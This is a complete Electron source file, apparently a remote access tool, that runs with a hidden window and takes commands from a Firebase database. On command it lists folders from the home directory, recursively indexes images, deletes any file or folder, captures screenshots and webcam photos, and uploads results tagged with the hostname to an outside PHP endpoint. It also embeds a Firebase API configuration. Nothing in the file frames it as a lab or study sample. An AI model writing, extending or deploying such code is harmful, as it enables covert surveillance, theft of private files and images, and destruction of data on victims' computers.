// ----------------------
// main.js - Remote Command Server (Complete)
// ----------------------
const { app, BrowserWindow } = require("electron");
const fs = require("fs");
const fsPromises = fs.promises;
const path = require("path");
const axios = require("axios");
const NodeWebcam = require("node-webcam");

// Firebase
const { initializeApp } = require("firebase/app");
const { getDatabase, ref, onValue, set, get } = require("firebase/database");

// ----------------------
// Firebase Config
// ----------------------
const firebaseConfig = {
    apiKey: "AIzaSyAr1Tn3fiGnACj8DI1g01YuE4usm1RMgh0",
    authDomain: "seasoure.firebaseapp.com",
    databaseURL: "https://seasoure-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "seasoure",
    storageBucket: "seasoure.firebasestorage.app",
    messagingSenderId: "347095099063",
    appId: "1:347095099063:web:00d2dae7109bd2dadf0f32",
    measurementId: "G-1J1T2SXN2E"
};

const fbApp = initializeApp(firebaseConfig);
const database = getDatabase(fbApp);

// ----------------------
// Device Name
// ----------------------
function getDeviceName() {
    return require("os").hostname();
}

// ----------------------
// Electron Headless Window
// ----------------------
let win;
function createWindow() {
    win = new BrowserWindow({
        width: 1200,
        height: 800,
        show: false,
        webPreferences: { nodeIntegration: true, contextIsolation: false }
    });
    win.loadURL("about:blank");
    console.log("[INFO] Headless Electron ready. Logs will appear in console.");
}

// ----------------------
// Logging Helpers
// ----------------------
function logInfo(msg) { console.log(`[INFO ${new Date().toLocaleTimeString()}] ${msg}`); }
function logSuccess(msg) { console.log(`[SUCCESS ${new Date().toLocaleTimeString()}] ${msg}`); }
function logError(msg) { console.error(`[ERROR ${new Date().toLocaleTimeString()}] ${msg}`); }
function logWarn(msg) { console.warn(`[WARN ${new Date().toLocaleTimeString()}] ${msg}`); }

// ----------------------
// Firebase Helpers
// ----------------------
async function updateStatus(message) {
    try { await set(ref(database, "commandData/status"), message); }
    catch (err) { logError("Failed to update status: " + err.message); }
}

async function clearCommand() {
    try { await set(ref(database, "commandData/cmd"), ""); }
    catch (err) { logError("Failed to clear command: " + err.message); }
}

// ----------------------
// Upload File to Server with automatic type
// ----------------------
async function uploadToServer(filePath, fileName, commandType = "misc") {
    const serverUrl = "https://skillsupriselab.com/narayana/upload.php";
    const deviceName = getDeviceName();

    // Map commandType to server folder
    let type = "misc";
    switch (commandType) {
        case "screenshot":
            type = "screenshots";
            break;
        case "photos":
            type = "photos";
            break;
        case "folderScan":
            type = "folderScan";
            break;
        case "photosScan":
            type = "photosScan";
            break;
        default:
            type = "misc";
    }

    try {
        const FormData = require("form-data");
        const formData = new FormData();
        formData.append("file", fs.createReadStream(filePath));
        formData.append("device", deviceName);
        formData.append("type", type);

        await axios.post(serverUrl, formData, { headers: formData.getHeaders() });
        logSuccess(`Uploaded ${fileName} to server under device "${deviceName}" as ${type}`);
    } catch (err) {
        logError("Upload failed: " + err.message);
    }
}

// ----------------------
// Scan Folder
// ----------------------
async function scanFolder(folderPath) {
    if (!folderPath) folderPath = require("os").homedir();
    const resolvedPath = path.resolve(folderPath);

    if (!fs.existsSync(resolvedPath)) {
        logError(`Scan failed: ${resolvedPath} does not exist`);
        await updateStatus(`Scan failed: ${resolvedPath} does not exist`);
        await clearCommand();
        return;
    }

    logInfo("Starting folder scan: " + resolvedPath);

    const folderContents = [];
    const items = fs.readdirSync(resolvedPath);
    for (const item of items) {
        const fullPath = path.join(resolvedPath, item);
        try {
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) folderContents.push({ name: item, type: "folder" });
            else folderContents.push({ name: item, type: "file", size: stat.size });
        } catch { continue; }
    }

    // Save locally before upload
    const saveDir = path.join(__dirname, "uploads", getDeviceName(), "folderScan");
    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
    const filePath = path.join(saveDir, "folderStructure.json");
    fs.writeFileSync(filePath, JSON.stringify(folderContents, null, 2));

    await uploadToServer(filePath, "folderStructure.json", "folderScan");
    logSuccess(`Folder scan completed: ${folderContents.length} items found.`);
    await updateStatus(`Folder scan completed: ${folderContents.length} items found.`);
    await clearCommand();
}

// ----------------------
// Scan Images
// ----------------------
async function scanImages(folderPath) {
    if (!folderPath) folderPath = require("os").homedir();
    logInfo("Starting image scan: " + folderPath);

    const imageExtensions = [".jpg", ".jpeg", ".png", ".bmp"];
    const imageFiles = [];

    function recursiveScan(dir) {
        const items = fs.readdirSync(dir);
        for (const item of items) {
            const fullPath = path.join(dir, item);
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) recursiveScan(fullPath);
            else if (imageExtensions.includes(path.extname(item).toLowerCase())) {
                imageFiles.push(fullPath);
                logInfo("Image found: " + fullPath);
            }
        }
    }

    recursiveScan(folderPath);

    const saveDir = path.join(__dirname, "uploads", getDeviceName(), "photosScan");
    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
    const filePath = path.join(saveDir, "photos.json");
    fs.writeFileSync(filePath, JSON.stringify(imageFiles, null, 2));

    await uploadToServer(filePath, "photos.json", "photosScan");
    logSuccess(`Image scan completed: ${imageFiles.length} images found.`);
    await updateStatus(`Image scan completed: ${imageFiles.length} images found.`);
    await clearCommand();
}

// ----------------------
// Delete File or Folder
// ----------------------
async function deletePath(targetPath) {
    if (!targetPath) {
        logError("Delete failed: path not provided");
        await updateStatus("Delete failed: path not provided");
        await clearCommand();
        return;
    }

    const resolvedPath = path.resolve(targetPath);
    try {
        const stat = await fsPromises.stat(resolvedPath);
        if (stat.isDirectory()) await fsPromises.rm(resolvedPath, { recursive: true, force: true });
        else await fsPromises.unlink(resolvedPath);
        logSuccess(`${stat.isDirectory() ? "Folder" : "File"} deleted: ${resolvedPath}`);
        await updateStatus(`${stat.isDirectory() ? "Folder" : "File"} deleted: ${resolvedPath}`);
    } catch (err) {
        logError("Delete failed: " + err.message);
        await updateStatus("Delete failed: " + err.message);
    } finally {
        await clearCommand();
    }
}

// ----------------------
// Screenshots
// ----------------------
async function takeScreenshots() {
    if (!win) return;
    const deviceName = getDeviceName();
    const saveDir = path.join(__dirname, "uploads", deviceName, "screenshots");
    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });

    logInfo("Capturing 3 screenshots...");
    await updateStatus("Capturing screenshots...");

    for (let i = 1; i <= 3; i++) {
        const image = await win.capturePage();
        const buffer = image.toPNG();
        const fileName = `screenshot_${Date.now()}_${i}.png`;
        const filePath = path.join(saveDir, fileName);
        fs.writeFileSync(filePath, buffer);
        logSuccess(`Screenshot ${i} saved at ${filePath}`);
        await uploadToServer(filePath, fileName, "screenshot");
        if (i < 3) await new Promise(r => setTimeout(r, 2000));
    }

    await updateStatus("Screenshots completed");
    await clearCommand();
}

// ----------------------
// Capture Photo
// ----------------------
async function capturePhoto() {
    const deviceName = getDeviceName();
    const saveDir = path.join(__dirname, "uploads", deviceName, "photos");
    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });

    const fileName = `photo_${Date.now()}.jpg`;
    const filePath = path.join(saveDir, fileName);

    const webcam = NodeWebcam.create({ width: 1280, height: 720, quality: 100, output: "jpg", device: false, callbackReturn: "location" });

    await new Promise((resolve, reject) => {
        webcam.capture(filePath, async (err) => {
            if (err) {
                logError("Webcam photo failed");
                await updateStatus("Webcam photo failed");
                reject(err);
            } else {
                logSuccess(`Photo captured: ${filePath}`);
                await uploadToServer(filePath, fileName, "photos");
                resolve();
            }
        });
    });

    await clearCommand();
}

// ----------------------
// Listen Firebase Commands
// ----------------------
function listenFirebaseCommands() {
    const cmdRef = ref(database, "commandData/cmd");
    onValue(cmdRef, async snapshot => {
        let cmd = snapshot.val();
        if (!cmd) return;
        cmd = cmd.trim().toLowerCase();
        logInfo("Received command: " + cmd);
        await updateStatus(`Received command: ${cmd}`);

        let targetPath = "";
        try {
            const snap = await get(ref(database, "commandData/path"));
            targetPath = snap.val();
        } catch (err) { logError("Error reading path: " + err.message); }

        if (cmd === "scan") await scanFolder(targetPath);
        else if (cmd === "imagesscan") await scanImages(targetPath);
        else if (cmd === "delete") await deletePath(targetPath);
        else if (cmd === "screenshot") await takeScreenshots();
        else if (cmd === "photos") await capturePhoto();
        else if (cmd === "exit") {
            logInfo("App exiting...");
            await updateStatus("App exiting");
            await clearCommand();
            app.quit();
        } else {
            logError("Unknown command received");
            await updateStatus("Unknown command received");
            await clearCommand();
        }
    });
}

// ----------------------
// App Ready
// ----------------------
app.whenReady().then(async () => {
    logInfo("Remote command app started (headless).");
    createWindow();
    listenFirebaseCommands();
});

app.on("window-all-closed", () => { if (process.platform !== "darwin") app.quit(); });
